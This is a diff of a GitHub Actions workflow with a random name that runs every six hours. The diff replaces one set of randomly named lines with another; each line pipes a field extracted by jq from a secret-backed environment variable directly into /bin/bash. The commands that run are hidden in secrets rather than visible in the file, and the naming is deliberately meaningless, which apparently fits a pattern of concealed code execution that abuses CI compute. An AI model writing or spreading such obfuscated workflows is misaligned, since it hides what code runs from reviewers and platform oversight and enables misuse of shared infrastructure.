@@ -1,28 +1,26 @@
 name: yanxiaorou4187
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 5/6 * * *'
-jobs:  # 26081
+    - cron: '29 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yanxiaorou4187
         env:
-          mhv63: ${{ secrets.mhv63 }}
+          qzgxx5598: ${{ secrets.qzgxx5598 }}
         run: |
-          echo $mhv63 | jq -r .m89402 | /bin/bash
-          echo $vnd5525 | jq -r .lnjna2784 | /bin/bash
-          echo $fm16299 | jq -r .lqnn061 | /bin/bash
-          echo $cm57733 | jq -r .hr155 | /bin/bash
-          echo $bcpr30 | jq -r .ekkz244 | /bin/bash
-          echo $pd7 | jq -r .gsnnb0689 | /bin/bash
-          echo $dopry1 | jq -r .qkon40 | /bin/bash
-          echo $fbcw029 | jq -r .ek4 | /bin/bash
-          echo $wns8633 | jq -r .s512 | /bin/bash
-          echo $juon4 | jq -r .g8147 | /bin/bash
-          echo $pw8 | jq -r .qi334 | /bin/bash
+          echo $qzgxx5598 | jq -r .ta15 | /bin/bash
+          echo $srdgn7224 | jq -r .baua8056 | /bin/bash
+          echo $zqza4 | jq -r .ovlx71412 | /bin/bash
+          echo $rmjj966 | jq -r .d89555 | /bin/bash
+          echo $evea90 | jq -r .pzf73947 | /bin/bash
+          echo $xnpht18362 | jq -r .dbl18 | /bin/bash
+          echo $hjgoc3 | jq -r .edoc449 | /bin/bash
+          echo $i0740 | jq -r .ci3 | /bin/bash
+          echo $fwgbv6 | jq -r .dsu4 | /bin/bash
+          echo $qz4542 | jq -r .idgp03459 | /bin/bash
+          echo $dn3958 | jq -r .lehe0 | /bin/bash
 
